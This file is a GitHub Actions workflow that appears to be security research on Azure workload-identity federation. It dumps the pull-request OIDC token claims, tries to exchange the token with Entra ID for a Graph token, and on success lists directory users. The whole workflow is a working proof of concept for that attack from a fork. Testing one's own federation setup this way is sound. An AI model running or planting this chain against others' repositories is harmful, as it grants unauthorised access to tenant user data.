name: Test PR Federation (Misconfig Research)

on:
  pull_request:
    branches: [main]

permissions:
  id-token: write
  contents: read

jobs:
  test-pr-auth:
    runs-on: ubuntu-latest

    steps:
      - name: Dump OIDC token claims
        run: |
          echo "=== Requesting OIDC token ==="
          
          if [ -z "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then
            echo "ACTIONS_ID_TOKEN_REQUEST_URL is empty!"
            echo "This means the workflow does NOT have id-token permissions."
            exit 1
          fi

          TOKEN=$(curl -s \
            -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" \
            | jq -r '.value')

          echo ""
          echo "=== JWT Payload ==="
          echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq .

          echo ""
          echo "=== Key claims ==="
          PAYLOAD=$(echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null)
          echo "sub:                   $(echo $PAYLOAD | jq -r '.sub')"
          echo "repository:            $(echo $PAYLOAD | jq -r '.repository')"
          echo "repository_owner:      $(echo $PAYLOAD | jq -r '.repository_owner')"
          echo "repository_owner_id:   $(echo $PAYLOAD | jq -r '.repository_owner_id')"
          echo "actor:                 $(echo $PAYLOAD | jq -r '.actor')"
          echo "event_name:            $(echo $PAYLOAD | jq -r '.event_name')"
          echo "ref:                   $(echo $PAYLOAD | jq -r '.ref')"
          echo "head_ref:              $(echo $PAYLOAD | jq -r '.head_ref')"
          echo "base_ref:              $(echo $PAYLOAD | jq -r '.base_ref')"

      - name: Try to exchange for Azure AD token
        env:
          AZURE_CLIENT_ID: ${{ secrets.AZURE_CLIENT_ID_PR }}
          AZURE_TENANT_ID: ${{ secrets.AZURE_TENANT_ID }}
        run: |
          GH_TOKEN=$(curl -s \
            -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" \
            | jq -r '.value')

          echo "=== Exchanging with Entra ==="
          RESPONSE=$(curl -s -w "\n%{http_code}" \
            -X POST \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -d "grant_type=client_credentials&client_id=$AZURE_CLIENT_ID&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=$GH_TOKEN&scope=https://graph.microsoft.com/.default" \
            "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token")

          HTTP_CODE=$(echo "$RESPONSE" | tail -1)
          BODY=$(echo "$RESPONSE" | sed '$d')

          echo "HTTP $HTTP_CODE"
          if [ "$HTTP_CODE" = "200" ]; then
            echo "!!! SUCCESS — Got Azure AD token from a Pull Request !!!"
            AZURE_TOKEN=$(echo "$BODY" | jq -r '.access_token')

            echo ""
            echo "=== Calling Graph API to list users ==="
            curl -s \
              -H "Authorization: Bearer $AZURE_TOKEN" \
              "https://graph.microsoft.com/v1.0/users?\$select=displayName,userPrincipalName&\$top=5" \
              | jq '.value[]'

            echo ""
            echo "AN ATTACKER COULD DO THIS FROM A FORK."
          else
            echo "Failed (this is the safe outcome)"
            echo "$BODY" | jq .
          fi
